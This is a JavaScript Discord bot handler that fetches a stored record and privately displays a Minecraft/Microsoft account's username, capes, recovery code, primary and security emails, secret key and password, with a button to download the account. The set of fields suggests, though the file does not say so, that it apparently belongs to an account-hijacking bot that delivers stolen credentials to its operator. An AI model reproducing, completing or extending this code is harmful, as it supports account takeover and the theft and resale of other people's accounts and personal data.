const { queryParams } = require("../../../db/database");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

module.exports = {
    name: "copyText",
    callback: async (client, interaction) => {
        try {
            let [, copyTextId] = interaction.customId.split("|");
            const results = await queryParams("SELECT action FROM actions WHERE id = ?", [copyTextId]);

            if (!results || results.length === 0) {
                return interaction.reply({
                    content: `No action found for ID: ${copyTextId}`,
                    ephemeral: true,
                });
            }

            let [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = results[0].action.split("|");
          //  console.log(password)
            // Reply with account details and a download button
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`downloadacc|${copyTextId}`)
                    .setLabel('Download Account')
                    .setStyle(ButtonStyle.Secondary) // The style is now an enum, `ButtonStyle.Secondary`
            );

            return interaction.reply({
                content: `Username: ${newName}\nOwns MC: ${mc}\nCapes: ${capes}\nRecovery Code: ${recoveryCode}\nPrimary Email: ${email}\nSecurity Email: ${secEmail}\nSecret Key: ${secretkey}\nPassword: ${password}`,
                components: [row],
                ephemeral: true,
            });
        } catch (error) {
            console.error("Error processing copy text:", error);
            return interaction.reply({
                content: "An error occurred while retrieving the action details.",
                ephemeral: true,
            });
        }
    },
};
